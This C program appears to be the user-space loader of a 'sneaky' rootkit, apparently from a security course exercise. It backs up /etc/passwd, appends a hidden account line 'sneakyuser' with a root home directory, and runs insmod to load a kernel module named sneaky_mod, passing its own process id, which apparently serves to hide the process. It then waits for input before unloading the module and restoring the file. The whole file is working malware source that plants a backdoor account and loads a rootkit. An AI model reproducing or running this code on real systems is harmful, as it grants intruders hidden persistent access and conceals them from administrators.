#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h> 
#include <fcntl.h>
#include <unistd.h>

int copyFile(char* sourceFile, char* targetFile){
  FILE *fptr1, *fptr2;
  fptr1 = fopen(sourceFile, "r");
  if(fptr1 == NULL){
    printf("Cannot open file %s\n", sourceFile);
    return -1;
  }

  fptr2 = fopen(targetFile, "w");
  if(fptr2 == NULL){
    printf("Cannot open file %s \n", targetFile);
    return -1;
  }

  char c;
  c = fgetc(fptr1);
  while(c != EOF){
    fputc(c, fptr2);
    c = fgetc(fptr1);
  }
  fclose(fptr1);
  fclose(fptr2);
  return 0;
}

int addLine(char* addStr, char* filename){
  FILE *fptr = fopen(filename, "a");
  if(fptr == NULL){
    printf("Cannot open file %s\n", filename);
    return -1;
  }
  fprintf(fptr, "%s", addStr);
  fclose(fptr);
  return 0;
}

void loadModule(char* command, int pid){
  char id[12];
  sprintf(id, "%d", pid);
  char wholeCommand[strlen(command) + 1 + strlen(id)];
  strcpy(wholeCommand, command);
  strcat(wholeCommand, id);
  system(wholeCommand);
}

void unloadModule(){
  char * command = "rmmod sneaky_mod ";
  system(command);
}

int main(int argc, char* argv[]){
  printf("Sneaky process pid = %d\n", getpid());
  if(copyFile("/etc/passwd", "/tmp/passwd") != 0){
    printf("Failed to copy file \n");
    exit(EXIT_FAILURE);
  }
  char* addStr = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  if(addLine(addStr, "/etc/passwd") != 0){
    printf("Failed to add line \n");
    exit(EXIT_FAILURE);
  }

  char * command = "insmod sneaky_mod.ko ";
  int pid = getpid();
  loadModule(command, pid);
  printf("start sneaky shell\n");
  while(1){
    char input;
    input = getchar();
    if(input == 'q'){
      printf("end sneaky shell\n");
      unloadModule();
      if(copyFile("/tmp/passwd", "/etc/passwd") != 0){
	printf("Failed to copy file \n");
	exit(EXIT_FAILURE);
      }
      break;
    }
  }
  /*
  if(copyFile("/tmp/passwd", "/etc/passwd") != 0){
    printf("Failed to copy file \n");
    exit(EXIT_FAILURE);
  }
  */
  return 0;
}
